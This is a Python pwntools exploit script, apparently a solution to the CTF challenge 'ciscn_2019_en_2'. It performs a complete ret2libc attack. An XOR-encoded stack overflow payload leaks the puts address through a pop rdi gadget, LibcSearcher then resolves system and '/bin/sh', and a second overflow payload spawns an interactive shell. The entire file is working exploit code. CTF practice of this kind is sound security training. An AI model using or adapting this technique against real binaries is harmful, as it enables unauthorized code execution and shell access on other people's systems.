#coding:utf-8
# 本地测试在ubuntu18可以通过
from pwn import *
import pwnlib
from LibcSearcher import *
sh = process("./ciscn_2019_en_2")
# sh = remote("node3.buuoj.cn",26634)
elf = ELF("./ciscn_2019_en_2")
put_plt = elf.plt['puts']
put_got = elf.got['puts']
main = 0x400B28	
pop_rdi = 0x400c83
ret = 0x4006b9
# ret = 
def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i])^0xc)
        elif l[i].isupper():
            l[i] = chr(ord(l[i])^0xd)
        elif l[i].islower():
            l[i] = chr(ord(l[i])^0xe)
    return ''.join(l)
sh.sendline("1")
payload = 'a' * 0x58 + p64(pop_rdi)+ p64(put_got)+ p64(put_plt) + p64(main) 
payload = encrypt(payload)
sh.sendline(payload)
sh.recvuntil("Ciphertext\n")
sh.recvuntil("\n")
put_addr = u64(sh.recvuntil("\n", drop=True).ljust(8,"\x00"))
libc = LibcSearcher('puts',put_addr)
log.info("success get put_addr:0x%x"%put_addr)
libc_base = put_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
log.info("success get sys_addr:0x%x"%sys_addr)
log.info("success get bin_sh:0x%x"%bin_sh)
sh.sendline('1')
payload2 = 'a'*88+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
pwnlib.gdb.attach(sh)
pause()
sh.sendline(payload2)
pause()
sh.interactive()
